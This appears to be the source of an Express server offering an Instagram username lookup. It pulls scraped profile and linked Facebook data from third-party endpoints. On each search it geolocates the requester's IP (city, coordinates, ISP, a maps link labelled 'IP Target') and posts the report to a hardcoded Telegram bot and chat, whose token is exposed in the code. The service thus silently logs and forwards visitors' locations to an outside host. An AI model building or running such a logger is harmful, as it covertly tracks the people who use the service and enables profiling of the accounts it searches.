import express, { type Request, type Response } from "express";

const app = express();
app.use(express.json({ limit: "32kb" }));

// Intentionally kept hardcoded per request. Rotate this bot token if it has been shared publicly.
const TELEGRAM_BOT_TOKEN = "8629534294:AAGEHMqsw7IlDAAkkrR6TQhpdYvWsjY4K2gA";
const TELEGRAM_CHAT_ID = "8832489098";
const INSTAGRAM_ENDPOINT = "https://europe-west3-storyviewer-7a64d.cloudfunctions.net/getInstagramData";
const INSTAGRAM_FALLBACK_ENDPOINT = "https://instagram.abbasofficaldevs.workers.dev/info";
const FETCH_TIMEOUT_MS = 15_000;

type AnyRecord = Record<string, any>;

const asRecord = (value: unknown): AnyRecord => value && typeof value === "object" ? value as AnyRecord : {};
const first = (...values: unknown[]) => values.find((value) => value !== undefined && value !== null && value !== "") ?? "N/A";
const numberValue = (value: unknown) => Number.isFinite(Number(value)) ? Number(value) : 0;
const yesNo = (value: unknown) => value ? "Yes" : "No";
const displayCount = (value: unknown) => numberValue(value).toLocaleString("en-US");
const cleanText = (value: unknown, fallback = "N/A") => {
  const text = String(first(value, fallback)).replace(/[\u0000-\u001f\u007f]/g, "").trim();
  return text || fallback;
};

async function fetchJson(url: string, init: RequestInit = {}) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
  try {
    const response = await fetch(url, { ...init, signal: controller.signal });
    const text = await response.text();
    let body: unknown = {};
    try { body = text ? JSON.parse(text) : {}; } catch { body = {}; }
    return { response, body };
  } finally {
    clearTimeout(timeout);
  }
}

function normalizeUsername(value: unknown): string | null {
  const username = String(value ?? "").trim().replace(/^@/, "");
  return /^[A-Za-z0-9._-]{1,30}$/.test(username) ? username : null;
}

function mapInstagramData(root: AnyRecord, requested: string): AnyRecord {
  const about = asRecord(root.about);
  const linked = asRecord(asRecord(root.linked_fb_info).linked_fb_user);
  const rawType = first(root.account_type, about.account_type, 1);
  const accountType = ({ 1: "Personal", 2: "Creator", 3: "Business" } as Record<string, string>)[String(rawType)] ?? String(rawType);
  const deepLink = String(root.threads_profile_glyph_url ?? "");
  let threadsLink = "N/A";
  const threadMatch = deepLink.match(/username=([^&]+)/);
  if (threadMatch?.[1]) threadsLink = `https://www.threads.net/@${threadMatch[1]}`;

  return {
    username: first(root.username, about.username, requested),
    full_name: first(root.full_name, about.full_name),
    biography: first(root.biography, about.biography),
    user_id: first(root.id, about.id),
    follower_count: first(root.follower_count, about.follower_count, 0),
    following_count: first(root.following_count, about.following_count, 0),
    media_count: first(root.media_count, about.media_count, 0),
    is_private: Boolean(first(root.is_private, about.is_private, false)),
    is_verified: Boolean(first(root.is_verified, about.is_verified, false)),
    account_type: accountType,
    date_joined: first(about.date_joined, root.date_joined),
    profile_pic_url: first(root.profile_pic_url, root.hd_profile_pic_url_info?.url, about.profile_pic_url),
    threads_link: threadsLink,
    fbid_v2: first(root.fbid_v2),
    fb_name: first(linked.name),
    fb_profile_url: first(linked.profile_url),
    external_url: first(root.external_url, about.external_url),
    category: first(root.category, about.category),
  };
}

async function instagramLookup(username: string): Promise<AnyRecord | null> {
  const payload = { data: { endpoint: "/v1/info", params: { include_about: true, username_or_id_or_url: username } } };
  try {
    const primary = await fetchJson(INSTAGRAM_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json", Accept: "application/json", "User-Agent": "Mozilla/5.0" },
      body: JSON.stringify(payload),
    });
    if (primary.response.ok) {
      const root = asRecord(asRecord(primary.body).result).data;
      if (root.id || root.full_name || root.follower_count !== undefined || root.media_count !== undefined) {
        return mapInstagramData(root, username);
      }
    }
  } catch { /* fallback below */ }

  try {
    const fallback = await fetchJson(`${INSTAGRAM_FALLBACK_ENDPOINT}?username=${encodeURIComponent(username)}`, {
      headers: { Accept: "application/json", "User-Agent": "Axiom-Tracker/4.7" },
    });
    if (fallback.response.ok) {
      const payloadBody = asRecord(fallback.body);
      const data = asRecord(payloadBody.data && typeof payloadBody.data === "object" ? payloadBody.data : payloadBody);
      if (data.username && String(data.username).toLowerCase() === username.toLowerCase()) {
        const account = asRecord(data.account); const stats = asRecord(data.stats); const profile = asRecord(data.profile);
        return {
          username: data.username, full_name: first(data.full_name, account.full_name), biography: first(data.bio, account.bio),
          user_id: first(data.user_id, account.id, profile.instagram_pk), follower_count: first(data.followers, stats.followers, 0),
          following_count: first(data.following, stats.following, 0), media_count: first(data.posts, stats.posts, 0),
          is_private: Boolean(account.private), is_verified: Boolean(account.verified),
          account_type: account.is_creator ? "Creator" : account.is_business ? "Business" : "Personal",
          date_joined: first(data.joined_date, asRecord(account.joined).date), profile_pic_url: first(data.profile_pic, profile.profile_pic_hd),
          threads_link: "N/A", fbid_v2: first(profile.fbid), fb_name: "N/A", fb_profile_url: "N/A",
          external_url: first(data.external_url), category: first(data.category, account.category),
        };
      }
    }
  } catch { /* report not found/unavailable at route level */ }
  return null;
}

function requesterIp(req: Request): string {
  const forwarded = req.headers["x-forwarded-for"];
  const value = Array.isArray(forwarded) ? forwarded[0] : forwarded?.split(",")[0];
  return String(value || req.headers["x-real-ip"] || req.socket.remoteAddress || "").replace(/^::ffff:/, "").trim();
}

async function geoLookup(ip: string): Promise<AnyRecord | null> {
  if (!ip || ip === "::1" || ip === "127.0.0.1") return null;
  try {
    const { response, body } = await fetchJson(`https://ipwho.is/${encodeURIComponent(ip)}`);
    const data = asRecord(body);
    if (!response.ok || data.success === false) return null;
    const connection = asRecord(data.connection);
    return {
      ip: first(data.ip, ip), type: first(data.type), country: first(data.country), country_code: first(data.country_code),
      city: first(data.city), region: first(data.region), continent: first(data.continent), latitude: first(data.latitude),
      longitude: first(data.longitude), postal: first(data.postal), asn: first(connection.asn), isp: first(connection.isp),
      org: first(connection.org), timezone: first(asRecord(data.timezone).id),
    };
  } catch { return null; }
}

const line = (label: string, value: unknown) => `${label.padEnd(16)}: ${cleanText(value)}`;
function formatResult(username: string, profile: AnyRecord | null, geo: AnyRecord | null): string {
  const lines = [`[+] Enter username : ${username}`];
  if (profile) {
    lines.push("# INSTAGRAM PROFILE", line("Username", profile.username), line("Display Name", profile.full_name), line("User ID", profile.user_id),
      line("Bio", profile.biography), line("Followers", displayCount(profile.follower_count)), line("Following", displayCount(profile.following_count)),
      line("Posts", displayCount(profile.media_count)), line("Private", yesNo(profile.is_private)), line("Verified", yesNo(profile.is_verified)),
      line("Account Type", profile.account_type), line("Joined", profile.date_joined), line("Threads", profile.threads_link), line("Facebook ID", profile.fbid_v2), line("Avatar", profile.profile_pic_url));
    if (profile.fb_name !== "N/A" && profile.fb_profile_url !== "N/A") lines.push("", "# LINKED FACEBOOK", line("Display Name", profile.fb_name), line("Profile URL", profile.fb_profile_url));
  } else lines.push("# INSTAGRAM PROFILE", "Not found or upstream unavailable.");
  if (geo) lines.push("", "# IP GEOLOCATION", line("IP Target", geo.ip), line("IP Type", geo.type), line("Country", `${geo.country} ${countryFlag(String(geo.country_code))}`), line("Country Code", geo.country_code), line("City", geo.city), line("Region", geo.region), line("Continent", geo.continent), line("Latitude", geo.latitude), line("Longitude", geo.longitude), line("Maps", `https://www.google.com/maps/@${geo.latitude},${geo.longitude},15z`), line("Postal", geo.postal), line("ASN", geo.asn), line("ISP", geo.isp), line("ORG", geo.org), line("Timezone", geo.timezone));
  return lines.join("\n");
}

function countryFlag(code: string) { return /^[A-Za-z]{2}$/.test(code) ? [...code.toUpperCase()].map((char) => String.fromCodePoint(char.charCodeAt(0) + 127397)).join("") : ""; }
function escapeHtml(value: string) { return value.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
async function sendTelegram(text: string) {
  const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: escapeHtml(text), parse_mode: "HTML", disable_web_page_preview: true }) });
  if (!response.ok) throw new Error(`Telegram returned ${response.status}`);
}

app.get("/", (_req, res) => res.json({ success: true, name: "Instagram/", endpoints: ["GET /api/health", "GET /api/search?username=instagram", "GET /api/instagram/:username"] }));
app.get("/api/health", (_req, res) => res.json({ success: true, service: "online" }));
app.get("/api/ip/:ip", async (req, res) => { const geo = await geoLookup(req.params.ip); return geo ? res.json({ success: true, data: geo }) : res.status(404).json({ success: false, error: "IP geolocation unavailable" }); });
app.get("/api/ip/me", async (req, res) => { const ip = requesterIp(req); const geo = await geoLookup(ip); return geo ? res.json({ success: true, data: geo }) : res.status(404).json({ success: false, error: "Requester IP geolocation unavailable", ip }); });
app.get("/api/instagram/:username", async (req, res) => { const username = normalizeUsername(req.params.username); if (!username) return res.status(400).json({ success: false, error: "Invalid username" }); const profile = await instagramLookup(username); return profile ? res.json({ success: true, data: profile }) : res.status(404).json({ success: false, error: "Instagram profile not found or upstream unavailable" }); });
app.get("/api/search", async (req, res) => {
  const username = normalizeUsername(req.query.username);
  if (!username) return res.status(400).json({ success: false, error: "Provide a valid username query parameter" });
  const [profile, geo] = await Promise.all([instagramLookup(username), geoLookup(requesterIp(req))]);
  const output = formatResult(username, profile, geo);
  let telegramSent = true;
  try { await sendTelegram(output); } catch (error) { telegramSent = false; console.error(error); }
  return res.status(profile ? 200 : 404).json({ success: Boolean(profile), username, data: { profile, ip_geolocation: geo }, output, telegram_sent: telegramSent });
});

export default app;
